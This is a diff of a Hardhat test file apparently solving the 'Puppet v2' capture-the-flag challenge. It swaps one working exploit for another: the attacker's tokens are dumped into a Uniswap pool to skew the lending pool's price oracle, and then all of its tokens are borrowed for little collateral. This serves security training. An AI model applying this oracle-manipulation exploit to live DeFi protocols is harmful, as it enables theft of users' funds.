@@ -113,91 +113,44 @@ describe('[Challenge] Puppet v2', function () {
 	});
 
 	it('Exploit', async function () {
-		/** CODE YOUR EXPLOIT HERE */
-		const ETH_MANTISSA = BigNumber.from(10).pow(18);
-		const UINT_256_MAX = BigNumber.from(2).pow(256).sub(1);
-
-		const toEth = (wei) => {
-			return ethers.utils.formatEther(wei);
-		};
-
+		// we can use same approach as puppet v1
 		const getDeadline = async () => {
-			const block = await web3.eth.getBlock('latest');
+			const block = await ethers.provider.getBlock('latest');
 			return block.timestamp + 300;
 		};
 
-		const calculateBorrowTokenFromWeth = async (wethAmount) => {
-			const [reservesToken, reservesWETH] =
-				await this.uniswapExchange.getReserves();
+		await this.token
+			.connect(attacker)
+			.approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
 
-			return wethAmount
-				.mul(reservesToken)
-				.div(reservesWETH.mul(BigNumber.from(3)));
-		};
+		// require 3 times 300,000 ETH before swap ( 3 X 10/100 x POOL_INITIAL_TOKEN_BALANCE )
+		const deadline = await getDeadline();
+		await this.uniswapRouter
+			.connect(attacker)
+			.swapExactTokensForETH(
+				ATTACKER_INITIAL_TOKEN_BALANCE,
+				ethers.utils.parseEther('9.9'),
+				[this.token.address, this.weth.address],
+				attacker.address,
+				deadline,
+			);
+		const balance = await ethers.provider.getBalance(attacker.address);
+		const depositRequired =
+			await this.lendingPool.calculateDepositOfWETHRequired(
+				POOL_INITIAL_TOKEN_BALANCE,
+			);
 
-		// ensure the function is work as expected
-		const testBorrowToken = await calculateBorrowTokenFromWeth(
-			ethers.utils.parseEther('3'),
-		);
-		const testWethRequired =
-			await this.lendingPool.calculateDepositOfWETHRequired(testBorrowToken);
-		expect(testWethRequired).to.equal(ethers.utils.parseEther('3'));
+		expect(depositRequired).to.be.lt(balance);
+
+		// require ~ 29 ETH after swap ( 3 X 0.1/ 10100 x POOL_INITIAL_TOKEN_BALANCE )
+
+		await this.weth.connect(attacker).deposit({ value: depositRequired });
 
 		await this.weth
 			.connect(attacker)
-			.approve(this.lendingPool.address, UINT_256_MAX);
+			.approve(this.lendingPool.address, depositRequired);
 
-		await this.token
-			.connect(attacker)
-			.approve(this.uniswapRouter.address, UINT_256_MAX);
-
-		let poolBalance = await this.token.balanceOf(this.lendingPool.address);
-		while (poolBalance.gt(BigNumber.from(0))) {
-			let wethBalance = (await ethers.provider.getBalance(attacker.address))
-				.mul(50)
-				.div(100);
-
-			await this.weth.connect(attacker).deposit({ value: wethBalance });
-
-			let borrowToken = await calculateBorrowTokenFromWeth(wethBalance);
-
-			const borrowAmount = borrowToken.gte(poolBalance)
-				? poolBalance
-				: borrowToken;
-
-			await this.lendingPool.connect(attacker).borrow(borrowAmount);
-			poolBalance = await this.token.balanceOf(this.lendingPool.address);
-			tokenBalance = await this.token.balanceOf(attacker.address);
-
-			const deadLine = await getDeadline();
-			await this.uniswapRouter
-				.connect(attacker)
-				.swapExactTokensForETH(
-					tokenBalance,
-					ethers.utils.parseEther('0'),
-					[this.token.address, this.weth.address],
-					attacker.address,
-					deadLine,
-				);
-
-			poolBalance = await this.token.balanceOf(this.lendingPool.address);
-		}
-
-		const ethBalance = (await ethers.provider.getBalance(attacker.address))
-			.mul(90)
-			.div(100);
-		const deadLine = await getDeadline();
-		await this.uniswapRouter
-			.connect(attacker)
-			.swapExactETHForTokens(
-				ethers.utils.parseEther('0'),
-				[this.weth.address, this.token.address],
-				attacker.address,
-				deadLine,
-				{ value: ethBalance },
-			);
-
-		tokenBalance = await this.token.balanceOf(attacker.address);
+		await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
 	});
 
 	after(async function () {
